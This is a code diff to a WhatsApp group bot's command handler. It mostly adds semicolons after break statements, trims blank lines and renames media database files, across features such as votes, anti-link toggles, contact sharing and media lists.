@@ -11552,18 +11301,16 @@ let msgs = generateWAMessageFromContent(m.chat, {
 }, { quoted: m })
 await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'readmore': {
 	let [l, r] = text.split`|`
     if (!l) l = ''
     if (!r) r = ''
     XenonBotInc.sendMessage(m.chat, {text: l + readmore + r}, {quoted: m})
 }
-break
-//===========================================================================================================================//
-;
+break;
+//===========================================================================================================================//;
 			case 'xvideodl': case 'xvideosearch': case 'xvideo': case 'xvideos': case 'xvideosdl': {
 	if (!m.isGroup) return XenonStickGroup()
 	if (!AntiNsfw) return replygcxenon(mess.nsfw)
@@ -11673,9 +11420,8 @@ await XenonBotInc.relayMessage(m.chat, msgs.message, {})
       return replygcxenon('Failed to fetch Xvideos video details.');
     }
   };
-  break
+  break;
 //===========================================================================================================================//
-
   case 'xnxxdl': case 'xnxx': case 'xnxxsearch': {
   if (!m.isGroup) return XenonStickGroup()
 	if (!AntiNsfw) return replygcxenon(mess.nsfw)
@@ -11791,9 +11537,8 @@ await XenonBotInc.relayMessage(m.chat, msgs.message, {})
     }
   }
 }
-break
-//===========================================================================================================================//
-reak
+break;
+//===========================================================================================================================//reak
 			case 'yts': case 'ytsearch': {
   if (!text) return replygcxenon(`*Example :* ${prefix + command} title`);
   try {
@@ -11883,9 +11628,8 @@ let yts = require("yt-search")
     await replygcxenon(`Error`);
   }
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'wikipedia': case 'wiki': {
 	if (!text) return replygcxenon(`Enter what you want to search for on Wikipedia`)
 	
@@ -11941,9 +11685,8 @@ await XenonBotInc.relayMessage(m.chat, msgs.message, {})
   replygcxenon('⚠️ No results found ')
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'google': {
 if (!q) return replygcxenon(`Example : ${prefix + command} ${botname}`)
 await XenonStickWait()
@@ -11958,9 +11701,8 @@ teks += `⭔ *Link* : ${g.link}\n\n───────────────
 replygcxenon(teks)
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'getjoinrequest':{
 	if (!m.isGroup) return XenonStickGroup()
 	if (!m.isBotAdmin) return XenonStickBotAdmin()
@@ -11982,27 +11724,24 @@ if (!m.isAdmin && !XenonTheCreator) return XenonStickAdmin()
 
   XenonBotInc.sendMessage(m.chat, {text: replyMessage}, {quoted:m});
 };
-break
+break;
 //===========================================================================================================================//
-
 			case 'addbadword': case 'addbd':
                if (!XenonTheCreator) return XenonStickOwner()
                if (args.length < 1) return replygcxenon( `Send command ${prefix}addbadword [harsh word]. Example ${prefix}addbadword asshole`)
                bad.push(q)
                fs.writeFileSync('./src/badword.json', JSON.stringify(bad))
                replygcxenon('Successfully Added Bad Word!')
-            break
+            break;
 //===========================================================================================================================//
-
             case 'delbadword': case 'deldb':
                if (!XenonTheCreator) return XenonStickOwner()
                if (args.length < 1) return replygcxenon( `Send commands ${prefix}addbadword [bad word]. Example ${prefix}addbadword asshole`)                 
                bad.splice(q)
                fs.writeFileSync('./src/badword.json', JSON.stringify(bad))
                replygcxenon('Successfully Deleted Bad Word!')
-            break
-//===========================================================================================================================//
- 
+            break;
+//===========================================================================================================================// 
             case 'listbadword':{
 let teks = '┌──⭓「 *VN List* 」\n│\n'
 for (let x of bad) {
@@ -12011,9 +11750,8 @@ teks += `│⭔ ${x}\n`
 teks += `│\n└────────────⭓\n\n*Totally there are : ${bad.length}*`
 replygcxenon(teks)
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'antibadword':
             case 'antitoxic':{
 		         if (!m.isGroup) return XenonStickGroup()
@@ -12089,9 +11827,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
                }
-            break
+            break;
 //===========================================================================================================================//
-
             case 'antinsfw':
             case 'nsfw':{
 		         if (!m.isGroup) return XenonStickGroup()
@@ -12167,9 +11904,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
                }
-            break
+            break;
 //===========================================================================================================================//
-
 			case 'getbio':{
               try {
     let who
@@ -12188,12 +11924,10 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
     }
   }
 }
-break
+break;
 //===========================================================================================================================//
-
-        break
+        break;
 //===========================================================================================================================//
-
         case 'vote': {
             if (!m.isGroup) return XenonStickGroup()
             if (m.chat in vote) return replygcxenon(`_There are still votes in this chat!_\n\n*${prefix}deletevote* - to delete votes`)
@@ -12227,9 +11961,8 @@ Please Type Below
 *${prefix}deletevote* - to delete vote`
             XenonBotInc.sendMessage(m.chat, {text: teks_vote}, {quoted:m})
 	    }
-            break
+            break;
 //===========================================================================================================================//
-
                case 'upvote': {
             if (!m.isGroup) return XenonStickGroup()
             if (!(m.chat in vote)) return replygcxenon(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
@@ -12262,9 +11995,8 @@ Please Type Below
 *${prefix}deletevote* - to delete vote`
             XenonBotInc.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
 	    }
-             break
+             break;
 //===========================================================================================================================//
-
                 case 'downvote': {
             if (!m.isGroup) return XenonStickGroup()
             if (!(m.chat in vote)) return replygcxenon(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
@@ -12297,9 +12029,8 @@ Please Type Below
 *${prefix}deletevote* - to delete vote`
             XenonBotInc.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
 	}
-            break
+            break;
 //===========================================================================================================================//
-
                  
 case 'checkvote':
 if (!m.isGroup) return XenonStickGroup()
@@ -12328,21 +12059,18 @@ ${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 ©${XenonBotInc.user.id}
 `
 XenonBotInc.sendTextWithMentions(m.chat, teks_vote, m)
-break
+break;
 //===========================================================================================================================//
-
 		case 'deletevote': case'delvote': case 'hapusvote': {
             if (!m.isGroup) return XenonStickGroup()
             if (!(m.chat in vote)) return replygcxenon(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
             delete vote[m.chat]
             replygcxenon('Successfully Deleted Vote Session In This Group')
 	    }
-            break
+            break;
 //===========================================================================================================================//
-
-break
+break;
 //===========================================================================================================================//
-
 			case 'closetime':
                 if (!m.isGroup) return XenonStickGroup()
                 if (!m.isAdmin && !XenonTheCreator) return XenonStickAdmin()
@@ -12365,9 +12093,8 @@ break
                     XenonBotInc.groupSettingUpdate(m.chat, 'announcement')
                     replygcxenon(close)
                 }, timer)
-                break
+                break;
 //===========================================================================================================================//
-
             case 'opentime':
                 if (!m.isGroup) return XenonStickGroup()
                 if (!m.isAdmin && !XenonTheCreator) return replygcxenon(mess.admin)
@@ -12390,9 +12117,8 @@ break
                     XenonBotInc.groupSettingUpdate(m.chat, 'not_announcement')
                     replygcxenon(open)
                 }, timer)
-                break
+                break;
 //===========================================================================================================================//
-
 			case 'editinfo':{
                 if (!m.isGroup) return XenonStickGroup()
                 if (!m.isAdmin && !XenonTheCreator) return XenonStickAdmin()
@@ -12464,9 +12190,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
 }
-            break
+            break;
 //===========================================================================================================================//
-
 			case 'getcontact': case 'getcon': {
 if (!m.isGroup) return XenonStickGroup()
 if (!(m.isAdmin || XenonTheCreator)) return XenonStickAdmin()
@@ -12476,9 +12201,8 @@ xenonbigpp = await XenonBotInc.sendMessage(m.chat, {
 await sleep(1000)
 XenonBotInc.sendContact(m.chat, participants.map(a => a.id), xenonbigpp)
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'savecontact': case 'svcontact':{
 if (!m.isGroup) return XenonStickGroup()
 if (!(m.isAdmin || XenonTheCreator)) return XenonStickAdmin()
@@ -12498,9 +12222,8 @@ XenonBotInc.sendMessage(m.chat, {
 }, {ephemeralExpiration: 86400, quoted: m})
 require('fs').unlinkSync(nmfilect)
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'sendcontact': case 'sencontact': {
 if (!m.isGroup) return XenonStickGroup()
 if (!m.mentionedJid[0]) return replygcxenon('\nUse like this\n Example:.sendcontact @tag name')
@@ -12510,9 +12233,8 @@ let snContact = {
 }
 XenonBotInc.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'contacttag': case 'contag':{
 if (!m.isGroup) return XenonStickGroup()
 if (!(m.isAdmin || XenonTheCreator)) return XenonStickAdmin()
@@ -12523,9 +12245,8 @@ let sngContact = {
 }
 XenonBotInc.sendMessage(m.chat, {contacts: sngContact, mentions: participants.map(a => a.id)}, {ephemeralExpiration: 86400})
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'kickall': {
  if (!m.isGroup) return XenonStickGroup()
  if (!m.isAdmin && !XenonTheCreator) return XenonStickAdmin()
@@ -12548,9 +12269,8 @@ break
  }
  replygcxenon(`Success`);
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'promoteall': {
  if (!m.isGroup) return XenonStickGroup()
  if (!m.isAdmin && !XenonTheCreator) return XenonStickAdmin()
@@ -12570,9 +12290,8 @@ case 'promoteall': {
  }
  replygcxenon(`Success`);
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'demoteall': {
  if (!m.isGroup) return XenonStickGroup()
  if (!m.isAdmin && !XenonTheCreator) return XenonStickAdmin()
@@ -12592,9 +12311,8 @@ case 'demoteall': {
  }
  replygcxenon(`Success`);
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'ephemeral': {
                 if (!m.isGroup) return XenonStickGroup()
                 if (!m.isBotAdmin) return XenonStickBotAdmin()
@@ -12669,9 +12387,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 }
                 
             }
-            break
+            break;
 //===========================================================================================================================//
-
 			case 'invite': {
 	if (!m.isGroup) return XenonStickGroup()
 	if (!m.isBotAdmin) return XenonStickBotAdmin()
@@ -12683,9 +12400,8 @@ let link = 'https://chat.whatsapp.com/' + await XenonBotInc.groupInviteCode(grou
       await XenonBotInc.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
         replygcxenon(` An invite link is sent to the user`) 
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'tagadmin': case 'listadmin': case 'admin':{
     	if (!m.isGroup) return XenonStickGroup()
     const groupAdmins = participants.filter(p => p.admin)
@@ -12736,9 +12452,8 @@ let msgs = generateWAMessageFromContent(m.chat, {
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
    
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'linkgroup':
             case 'linkgrup':
             case 'linkgc':
@@ -12753,9 +12468,8 @@ break
                     detectLink: true
                 })
                 }
-            break
+            break;
 //===========================================================================================================================//
-
 			case 'antipoll':{
             	if (!m.isGroup) return XenonStickGroup()
 if (!m.isBotAdmin) return XenonStickBotAdmin()
@@ -12830,9 +12544,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
                }
-            break
+            break;
 //===========================================================================================================================//
-
             case 'antisticker':{
             	if (!m.isGroup) return XenonStickGroup()
 if (!m.isBotAdmin) return XenonStickBotAdmin()
@@ -12907,9 +12620,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
                }
-            break
+            break;
 //===========================================================================================================================//
-
             case 'antiimage':{
             	if (!m.isGroup) return XenonStickGroup()
 if (!m.isBotAdmin) return XenonStickBotAdmin()
@@ -12984,9 +12696,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
                }
-            break
+            break;
 //===========================================================================================================================//
-
             case 'antivideo':{
             	if (!m.isGroup) return XenonStickGroup()
 if (!m.isBotAdmin) return XenonStickBotAdmin()
@@ -13061,9 +12772,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
                }
-            break
+            break;
 //===========================================================================================================================//
-
             case 'antivirtex': case 'antivirus':{
 		         if (!m.isGroup) return XenonStickGroup()
 if (!m.isBotAdmin) return XenonStickBotAdmin()
@@ -13138,9 +12848,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
                }
-            break
+            break;
 //===========================================================================================================================//
-
 			case 'unavailable':
                 if (!XenonTheCreator) return XenonStickOwner()
                 if (q === 'on') {
@@ -13211,9 +12920,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
   messageId: msg.key.id
 })
 }
-            break
+            break;
 //===========================================================================================================================//
-
 			case 'welcome':
             case 'left': {
                if (!m.isGroup) return XenonStickGroup()
@@ -13287,9 +12995,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
             }
-            break
+            break;
 //===========================================================================================================================//
-
 case 'groupevent': {
                if (!m.isGroup) return XenonStickGroup()
 if (!m.isAdmin && !XenonTheCreator) return XenonStickAdmin()
@@ -13362,9 +13069,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
             }
-            break
-//===========================================================================================================================//
- 
+            break;
+//===========================================================================================================================// 
 			case 'antiviewonce':{
 		         if (!m.isGroup) return XenonStickGroup()
 if (!m.isBotAdmin) return XenonStickBotAdmin()
@@ -13439,9 +13145,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
                }
-            break
+            break;
 //===========================================================================================================================//
-
             case 'antimedia':{
 		         if (!m.isGroup) return XenonStickGroup()
 if (!m.isBotAdmin) return XenonStickBotAdmin()
@@ -13516,9 +13221,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
                }
-            break
+            break;
 //===========================================================================================================================//
-
             case 'antidocument':{
 		         if (!m.isGroup) return XenonStickGroup()
 if (!m.isBotAdmin) return XenonStickBotAdmin()
@@ -13593,9 +13297,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
                }
-            break
+            break;
 //===========================================================================================================================//
-
             case 'anticontact':{
 		         if (!m.isGroup) return XenonStickGroup()
 if (!m.isBotAdmin) return XenonStickBotAdmin()
@@ -13670,9 +13373,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
                }
-            break
+            break;
 //===========================================================================================================================//
-
             case 'antilocation':{
 		         if (!m.isGroup) return XenonStickGroup()
 if (!m.isBotAdmin) return XenonStickBotAdmin()
@@ -13746,9 +13448,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
                }
-            break
+            break;
 //===========================================================================================================================//
-
             case 'antilink': {
                if (!m.isGroup) return XenonStickGroup()
 if (!m.isBotAdmin) return XenonStickBotAdmin()
@@ -13822,9 +13523,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
             }
-            break
+            break;
 //===========================================================================================================================//
-
 			case 'antibot':{
 		         if (!m.isGroup) return XenonStickGroup()
 if (!m.isBotAdmin) return XenonStickBotAdmin()
@@ -13898,40 +13598,35 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
                }
-            break
+            break;
 //===========================================================================================================================//
-
 			case 'pinchat': {
 if (!XenonTheCreator) return XenonStickOwner()
 if (m.isGroup) return XenonStickPrivate()
 XenonBotInc.chatModify({ pin: true }, m.chat)
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'unpinchat': {
 if (!XenonTheCreator) return XenonStickOwner()
 if (m.isGroup) return XenonStickPrivate()
 XenonBotInc.chatModify({ pin: false }, m.chat)
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'clearchat': {
 if (!XenonTheCreator) return XenonStickOwner()
 XenonBotInc.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'checkmember': case 'cekmember':{
                                 if (!m.isAdmin && !XenonTheCreator) return XenonStickAdmin()
                                 if (!m.isGroup) return XenonStickGroup()
 replygcxenon(`Group: *${groupMetadata.subject}*\nTotal participants: *${participants.length}*`)
                                 }
-                                break
+                                break;
 //===========================================================================================================================//
-
 			case 'jpm': case 'post': case 'pushcontactgc': {
 if (!XenonTheCreator) return XenonStickOwner()
 if (!m.isGroup) return XenonStickGroup()
@@ -13954,9 +13649,8 @@ await sleep(text.split('|')[1])
 }}
 replygcxenon(`Success`)
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'pushcontact': {
     if (!XenonTheCreator) return XenonStickOwner()
     if (!m.isGroup) return XenonStickGroup()
@@ -13968,9 +13662,8 @@ break
      }  
      replygcxenon(`Done`)
       }
-      break
+      break;
 //===========================================================================================================================//
-
 case 'pushcontactv2':{
 if (!XenonTheCreator) return XenonStickOwner()
 if (!q) return replygcxenon(`Incorrect Usage Please Use Command Like This\n${prefix+command} idgc|text`)
@@ -13986,9 +13679,8 @@ replygcxenon(`Success`)
 	replygcxenon(`Incorrect Usage Please Use Command Like This\n${prefix+command} idgc|text`)
 	}
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'pushcontactv3': {
 if (!XenonTheCreator) return XenonStickOwner()
 if (!m.isGroup) return XenonStickGroup()
@@ -14029,9 +13721,8 @@ ${prefix+command} pause|text
 )
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'autosticker': case 'autostickergc':
 if (!XenonTheCreator) return XenonStickOwner()        
                 if (q == 'on') {
@@ -14102,9 +13793,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
   messageId: msg.key.id
 })
 }
-            break
+            break;
 //===========================================================================================================================//
-
 			case 'addvideo':{
 if (!XenonTheCreator) return XenonStickOwner()
 if (args.length < 1) return replygcxenon('Whats the video name?')
@@ -14116,9 +13806,8 @@ fs.writeFileSync('./XenonMedia/database/xenonvideo.json', JSON.stringify(VideoXe
 fs.unlinkSync(delb)
 replygcxenon(`Success Adding Video\nCheck by typing ${prefix}listvideo`)
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'delvideo':{
 if (!XenonTheCreator) return XenonStickOwner()
 if (args.length < 1) return replygcxenon('Enter the video name')
@@ -14129,9 +13818,8 @@ fs.writeFileSync('./XenonMedia/database/xenonvideo.json', JSON.stringify(VideoXe
 fs.unlinkSync(`./XenonMedia/video/${q}.mp4`)
 replygcxenon(`Success deleting video ${q}`)
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'listvideo':{
 let teks = '┌──⭓「 *Video List* 」\n│\n'
 for (let x of VideoXenon) {
@@ -14140,9 +13828,8 @@ teks += `│${setv} ${x}\n`
 teks += `│\n└────────────⭓\n\n*Totally there are : ${VideoXenon.length}*`
 replygcxenon(teks)
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'addimage':{
 if (!XenonTheCreator) return XenonStickOwner()
 if (args.length < 1) return replygcxenon('Whats the image name?')
@@ -14150,26 +13837,24 @@ if (ImageXenon.includes(q)) return replygcxenon("The name is already in use")
 let delb = await XenonBotInc.downloadAndSaveMediaMessage(quoted)
 ImageXenon.push(q)
 await fsx.copy(delb, `./XenonMedia/image/${q}.jpg`)
-fs.writeFileSync('./XenonMedia/database/xeonimage.json', JSON.stringify(ImageXenon))
+fs.writeFileSync('./XenonMedia/database/xenonimage.json', JSON.stringify(ImageXenon))
 fs.unlinkSync(delb)
 replygcxenon(`Success Adding Image\nCheck by typing ${prefix}listimage`)
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'delimage':{
 if (!XenonTheCreator) return XenonStickOwner()
 if (args.length < 1) return replygcxenon('Enter the image name')
 if (!ImageXenon.includes(q)) return replygcxenon("The name does not exist in the database")
 let wanu = ImageXenon.indexOf(q)
 ImageXenon.splice(wanu, 1)
-fs.writeFileSync('./XenonMedia/database/xeonimage.json', JSON.stringify(ImageXenon))
+fs.writeFileSync('./XenonMedia/database/xenonimage.json', JSON.stringify(ImageXenon))
 fs.unlinkSync(`./XenonMedia/image/${q}.jpg`)
 replygcxenon(`Success deleting image ${q}`)
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'listimage':{
 let teks = '┌──⭓「 *Image List* 」\n│\n'
 for (let x of ImageXenon) {
@@ -14178,9 +13863,8 @@ teks += `│${setv} ${x}\n`
 teks += `│\n└────────────⭓\n\n*Totally there are : ${ImageXenon.length}*`
 replygcxenon(teks)
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'addsticker':{
 if (!XenonTheCreator) return XenonStickOwner()
 if (args.length < 1) return replygcxenon('Whats the sticker name?')
@@ -14188,26 +13872,24 @@ if (StickerXenon.includes(q)) return replygcxenon("The name is already in use")
 let delb = await XenonBotInc.downloadAndSaveMediaMessage(quoted)
 StickerXenon.push(q)
 await fsx.copy(delb, `./XenonMedia/sticker/${q}.webp`)
-fs.writeFileSync('./XenonMedia/database/xenonsticker.json', JSON.stringify(StickerXenon))
+fs.writeFileSync('./XenonMedia/database/XenonSticker.json', JSON.stringify(StickerXenon))
 fs.unlinkSync(delb)
 replygcxenon(`Success Adding Sticker\nCheck by typing ${prefix}liststicker`)
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'delsticker':{
 if (!XenonTheCreator) return XenonStickOwner()
 if (args.length < 1) return replygcxenon('Enter the sticker name')
 if (!StickerXenon.includes(q)) return replygcxenon("The name does not exist in the database")
 let wanu = StickerXenon.indexOf(q)
 StickerXenon.splice(wanu, 1)
-fs.writeFileSync('./XenonMedia/database/xenonsticker.json', JSON.stringify(StickerXenon))
+fs.writeFileSync('./XenonMedia/database/XenonSticker.json', JSON.stringify(StickerXenon))
 fs.unlinkSync(`./XenonMedia/sticker/${q}.webp`)
 replygcxenon(`Success deleting sticker ${q}`)
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'liststicker':{
 let teks = '┌──⭓「 *Sticker List* 」\n│\n'
 for (let x of StickerXenon) {
@@ -14216,9 +13898,8 @@ teks += `│${setv} ${x}\n`
 teks += `│\n└────────────⭓\n\n*Totally there are : ${StickerXenon.length}*`
 replygcxenon(teks)
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'addvn':{
 if (!XenonTheCreator) return XenonStickOwner()
 if (args.length < 1) return replygcxenon('Whats the audio name?')
@@ -14230,9 +13911,8 @@ fs.writeFileSync('./XenonMedia/database/xenonvn.json', JSON.stringify(VoiceNoteX
 fs.unlinkSync(delb)
 replygcxenon(`Success Adding Audio\nCheck by typing ${prefix}listvn`)
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'delvn':{
 if (!XenonTheCreator) return XenonStickOwner()
 if (args.length < 1) return replygcxenon('Enter the vn name')
@@ -14243,9 +13923,8 @@ fs.writeFileSync('./XenonMedia/database/xenonvn.json', JSON.stringify(VoiceNoteX
 fs.unlinkSync(`./XenonMedia/audio/${q}.mp3`)
 replygcxenon(`Success deleting vn ${q}`)
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'listvn':{
 let teks = '┌──⭓「 *VN List* 」\n│\n'
 for (let x of VoiceNoteXenon) {
@@ -14254,9 +13933,8 @@ teks += `│${setv} ${x}\n`
 teks += `│\n└────────────⭓\n\n*Totally there are : ${VoiceNoteXenon.length}*`
 replygcxenon(teks)
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'addzip':{
 if (!XenonTheCreator) return XenonStickOwner()
 
@@ -14272,9 +13950,8 @@ fs.unlinkSync(delb)
 replygcxenon(`Success Adding zip\nTo check type ${prefix}listzip`)
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'delzip':{
 if (!XenonTheCreator) return XenonStickOwner()
 
@@ -14289,9 +13966,8 @@ fs.unlinkSync(`./XenonMedia/zip/${teks}.zip`)
 replygcxenon(`Successfully deleted zip ${teks}`)
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'listzip': {
 
 let teksooooo = '┌──⭓「 *ZIP LIST* 」\n│\n'
@@ -14301,9 +13977,8 @@ teksooooo += `│${setv} ${x}\n`
 teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipXenon.length}*`
 replygcxenon(teksooooo)
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'addapk':{
 if (!XenonTheCreator) return XenonStickOwner()
 
@@ -14319,9 +13994,8 @@ fs.unlinkSync(delb)
 replygcxenon(`Successful Adding apk\nTo Check type ${prefix}listapk`)
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'delapk':{
 if (!XenonTheCreator) return XenonStickOwner()
 
@@ -14336,9 +14010,8 @@ fs.unlinkSync(`./XenonMedia/apk/${teks}.apk`)
 replygcxenon(`Successfully deleted Apk ${teks}`)
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'listapk': {
 
 let teksoooooo = '┌──⭓「 *APK LIST* 」\n│\n'
@@ -14348,9 +14021,8 @@ teksoooooo += `│${setv} ${x}\n`
 teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkXenon.length}`
 replygcxenon(teksoooooo)
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'addpdf':{
 if (!XenonTheCreator) return XenonStickOwner()
 
@@ -14366,9 +14038,8 @@ fs.unlinkSync(delb)
 replygcxenon(`Successful Adding Pdf\nTo check type ${prefix}listpdf`)
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'delpdf':{
 if (!XenonTheCreator) return XenonStickOwner()
 
@@ -14383,9 +14054,8 @@ fs.unlinkSync(`./XenonMedia/doc/${teks}.pdf`)
 replygcxenon(`Successfully deleted pdf ${teks}`)
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'listpdf': {
 
 let teksoooo = '┌──⭓「 *PDF LIST* 」\n│\n'
@@ -14395,9 +14065,8 @@ teksoooo += `│${setv} ${x}\n`
 teksoooo += `│\n└────────────⭓\n\n*Total : ${DocXenon.length}*`
 replygcxenon(teksoooo)
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'addmsg': {
 				if (!XenonTheCreator) return XenonStickOwner()
 				if (!m.quoted) return replygcxenon('Reply to messages you want to save in the database')
@@ -14408,9 +14077,8 @@ break
 				delete msgs[text.toLowerCase()].chat
 				replygcxenon(`Successfully added the message to the message list as '${text}'\nAccess with ${prefix}getmsg ${text}\nView the Message With ${prefix}listmsg`)
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'delmsg': case 'deletemsg': {
 				if (!XenonTheCreator) return XenonStickOwner()
 				if (!text) return replygcxenon('The name of the message you want to delete?')
@@ -14424,18 +14092,16 @@ break
 					replygcxenon(`Successfully deleted '${text}' from the message list`)
 				}
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'getmsg': {
 				if (!text) return replygcxenon(`Example : ${prefix + command} file name\n\nView the list of messages with ${prefix}listmsg`)
 				let msgs = global.db.database
 				if (!(text.toLowerCase() in msgs)) return replygcxenon(`'${text}' not listed in the message list`)
 				await XenonBotInc.relayMessage(m.chat, msgs[text.toLowerCase()], {})
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'listmsg': {
 				let seplit = Object.entries(global.db.database).map(([nama, isi]) => { return { nama, ...isi } })
 				let teks = '「 LIST DATABASE 」\n\n'
@@ -14444,9 +14110,8 @@ break
 				}
 				replygcxenon(teks)
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'addowner':
 if (!XenonTheCreator) return XenonStickOwner()
 if (!args[0]) return replygcxenon(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
@@ -14456,9 +14121,8 @@ if (ceknye.length == 0) return replygcxenon(`Enter A Valid And Registered Number
 owner.push(bnnd)
 fs.writeFileSync('./src/owner.json', JSON.stringify(owner))
 replygcxenon(`Number ${bnnd} Has Become An Owner!!!`)
-break
+break;
 //===========================================================================================================================//
-
 case 'delowner':
 if (!XenonTheCreator) return XenonStickOwner()
 if (!args[0]) return replygcxenon(`Use ${prefix+command} number\nExample ${prefix+command} 2250500107362`)
@@ -14467,9 +14131,8 @@ unp = owner.indexOf(ya)
 owner.splice(unp, 1)
 fs.writeFileSync('./src/owner.json', JSON.stringify(owner))
 replygcxenon(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
-break
+break;
 //===========================================================================================================================//
-
 case 'listowner': {
                 let teks = '┌──⭓「 *List Owner* 」\n│\n'
                 for (let x of owner) {
@@ -14478,48 +14141,42 @@ case 'listowner': {
                 teks += `│\n└────────────⭓\n\n*Total : ${owner.length}*`
                 replygcxenon(teks)
             }
-            break
+            break;
 //===========================================================================================================================//
-
 			case 'shutdown':{
                 if (!XenonTheCreator) return XenonStickOwner()
                 replygcxenon(`Restarting will be completed in seconds`)
                 await sleep(3000)
                 process.exit()
                 }
-            break
+            break;
 //===========================================================================================================================//
-
 			  case 'userjid':
   case 'jid':
   case 'groupjid':
             case 'id':{
             replygcxenon(m.chat)
            }
-          break
+          break;
 //===========================================================================================================================//
-
 			case 'getexif': case 'getwm': case 'getwatermark':{
                 if (!XenonTheCreator) return XenonStickOwner()
                replygcxenon(`*Water Mark/Exif of ${botname} is*\n\n${setv} Packname : ${packname}\n${setv} Author : ${author}`)
                }
-                break
+                break;
 //===========================================================================================================================//
-
                 case 'getautoblocknumber': case 'getautoblockno': case 'getautoblock':{
                 if (!XenonTheCreator) return XenonStickOwner()
                replygcxenon(`*Auto Block Country Code of ${botname} is*\n\n${setv} Country Code : ${autoblocknumber}\n\n_Note: Once autoblock number is activated, numbers related to this country code will be blocked automatcially_`)
                }
-                break
+                break;
 //===========================================================================================================================//
-
                 case 'getantiforeign': case 'getantiforeignno': case 'getantiforeignnumber':{
                 if (!XenonTheCreator) return XenonStickOwner()
